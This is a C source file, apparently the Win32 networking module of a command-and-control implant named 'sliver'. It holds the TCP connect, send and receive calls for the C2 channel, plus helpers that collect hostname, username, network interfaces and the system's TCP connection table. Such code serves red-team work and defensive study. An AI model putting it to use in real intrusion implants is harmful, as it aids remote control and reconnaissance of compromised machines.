/* src/platform/win32/net.c - blocking TCP sockets (Win32). */
#include "sliver/platform.h"
#include "sliver/proc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tcpmib.h>

struct sliver_socket {
  SOCKET fd;
};

sliver_socket_t *sliver_tcp_connect(const char *host, uint16_t port) {
  struct addrinfo hints;
  struct addrinfo *res = NULL;
  struct addrinfo *it;
  char service[8];
  sliver_socket_t *sock = NULL;
  SOCKET fd = INVALID_SOCKET;

  if (host == NULL) {
    return NULL;
  }
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  (void)snprintf(service, sizeof(service), "%u", (unsigned)port);
  if (getaddrinfo(host, service, &hints, &res) != 0) {
    return NULL;
  }
  for (it = res; it != NULL; it = it->ai_next) {
    fd = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
    if (fd == INVALID_SOCKET) {
      continue;
    }
    /* Never hand the C2 socket to a spawned child: a killed implant would
     * otherwise leave the connection (and the session) alive. */
    (void)SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);
    if (connect(fd, it->ai_addr, (int)it->ai_addrlen) == 0) {
      sock = (sliver_socket_t *)calloc(1, sizeof(*sock));
      if (sock != NULL) {
        sock->fd = fd;
        fd = INVALID_SOCKET;
      }
      break;
    }
    closesocket(fd);
    fd = INVALID_SOCKET;
  }
  freeaddrinfo(res);
  if (fd != INVALID_SOCKET) {
    closesocket(fd);
  }
  return sock;
}

long sliver_socket_send(sliver_socket_t *s, const void *buf, size_t len) {
  int n;
  if (s == NULL || buf == NULL) {
    return -1;
  }
  n = send(s->fd, (const char *)buf, (int)len, 0);
  return (long)n;
}

long sliver_socket_recv(sliver_socket_t *s, void *buf, size_t len) {
  int n;
  if (s == NULL || buf == NULL) {
    return -1;
  }
  n = recv(s->fd, (char *)buf, (int)len, 0);
  return (long)n;
}

void sliver_socket_close(sliver_socket_t *s) {
  if (s == NULL) {
    return;
  }
  closesocket(s->fd);
  free(s);
}

/* --- identity helpers --------------------------------------------------- */
int sliver_hostname(char *buf, size_t cap) {
  DWORD len;
  if (buf == NULL || cap == 0) {
    return -1;
  }
  len = (DWORD)cap;
  if (!GetComputerNameA(buf, &len)) {
    return -1;
  }
  buf[cap - 1] = '\0';
  return 0;
}

int sliver_username(char *buf, size_t cap) {
  const char *user = getenv("USERNAME");
  if (buf == NULL || cap == 0 || user == NULL) {
    return -1;
  }
  (void)snprintf(buf, cap, "%s", user);
  return 0;
}

unsigned sliver_current_pid(void) { return (unsigned)GetCurrentProcessId(); }

void sliver_socket_set_recv_timeout(sliver_socket_t *s, int ms) {
  DWORD tv;
  if (s == NULL) {
    return;
  }
  tv = (DWORD)ms;
  (void)setsockopt(s->fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
  /* Bound sends too: an unresponsive peer must not freeze whichever thread is
   * writing (the session loop used to block here indefinitely). */
  {
    DWORD snd = 5000;
    (void)setsockopt(s->fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&snd, sizeof(snd));
  }
}


/* --- interfaces (ifconfig) ---------------------------------------------- */
int sliver_net_list(sliver_iface_t *out, int max) {
  ULONG size = 0;
  IP_ADAPTER_ADDRESSES *addrs;
  IP_ADAPTER_ADDRESSES *cur;
  int count = 0;

  if (out == NULL || max <= 0) {
    return -1;
  }
  if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
                                           GAA_FLAG_SKIP_DNS_SERVER,
                           NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
    return -1;
  }
  addrs = (IP_ADAPTER_ADDRESSES *)malloc(size);
  if (addrs == NULL) {
    return -1;
  }
  if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
                                           GAA_FLAG_SKIP_DNS_SERVER,
                           NULL, addrs, &size) != NO_ERROR) {
    free(addrs);
    return -1;
  }
  for (cur = addrs; cur != NULL && count < max; cur = cur->Next) {
    IP_ADAPTER_UNICAST_ADDRESS *ua;
    sliver_iface_t *it = &out[count];
    memset(it, 0, sizeof(*it));
    it->index = (int)cur->IfIndex;
    if (cur->FriendlyName != NULL && cur->FriendlyName[0] != 0) {
      (void)WideCharToMultiByte(CP_UTF8, 0, cur->FriendlyName, -1, it->name, (int)sizeof(it->name),
                                NULL, NULL);
    } else {
      (void)snprintf(it->name, sizeof(it->name), "%s",
                     cur->AdapterName != NULL ? cur->AdapterName : "");
    }
    if (cur->PhysicalAddressLength >= 6) {
      (void)snprintf(it->mac, sizeof(it->mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                     cur->PhysicalAddress[0], cur->PhysicalAddress[1], cur->PhysicalAddress[2],
                     cur->PhysicalAddress[3], cur->PhysicalAddress[4], cur->PhysicalAddress[5]);
    }
    for (ua = cur->FirstUnicastAddress; ua != NULL && it->ip_count < 8; ua = ua->Next) {
      char host[64];
      if (getnameinfo(ua->Address.lpSockaddr, ua->Address.iSockaddrLength, host, sizeof(host),
                      NULL, 0, NI_NUMERICHOST) == 0) {
        (void)snprintf(it->ips[it->ip_count], sizeof(it->ips[0]), "%s", host);
        it->ip_count++;
      }
    }
    count++;
  }
  free(addrs);
  return count;
}




/* --- sockets (netstat) --------------------------------------------------- */
static const char *tcp_state_name(DWORD state) {
  switch (state) {
    case 1: return "CLOSED";
    case 2: return "LISTEN";
    case 3: return "SYN_SENT";
    case 4: return "SYN_RCVD";
    case 5: return "ESTABLISHED";
    case 6: return "FIN_WAIT1";
    case 7: return "FIN_WAIT2";
    case 8: return "CLOSE_WAIT";
    case 9: return "CLOSING";
    case 10: return "LAST_ACK";
    case 11: return "TIME_WAIT";
    case 12: return "DELETE_TCB";
    default: return "UNKNOWN";
  }
}

static void format_v4(DWORD addr, char *out, size_t cap) {
  (void)snprintf(out, cap, "%u.%u.%u.%u", (unsigned)(addr & 0xff), (unsigned)((addr >> 8) & 0xff),
                 (unsigned)((addr >> 16) & 0xff), (unsigned)((addr >> 24) & 0xff));
}

int sliver_net_sockets(sliver_sock_t *out, int max) {
  DWORD size = 0;
  MIB_TCPTABLE_OWNER_PID *table;
  int count = 0;

  if (out == NULL || max <= 0) {
    return -1;
  }
  if (GetExtendedTcpTable(NULL, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) !=
      ERROR_INSUFFICIENT_BUFFER) {
    return -1;
  }
  table = (MIB_TCPTABLE_OWNER_PID *)malloc(size);
  if (table == NULL) {
    return -1;
  }
  if (GetExtendedTcpTable(table, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != NO_ERROR) {
    free(table);
    return -1;
  }
  for (DWORD i = 0; i < table->dwNumEntries && count < max; ++i) {
    MIB_TCPROW_OWNER_PID *row = &table->table[i];
    sliver_sock_t *e = &out[count];
    memset(e, 0, sizeof(*e));
    format_v4(row->dwLocalAddr, e->local_ip, sizeof(e->local_ip));
    e->local_port = (uint32_t)ntohs((u_short)row->dwLocalPort);
    format_v4(row->dwRemoteAddr, e->remote_ip, sizeof(e->remote_ip));
    e->remote_port = (uint32_t)ntohs((u_short)row->dwRemotePort);
    (void)snprintf(e->state, sizeof(e->state), "%s", tcp_state_name(row->dwState));
    e->pid = (int32_t)row->dwOwningPid;
    (void)snprintf(e->proto, sizeof(e->proto), "%s", "tcp");
    count++;
  }
  free(table);
  return count;
}




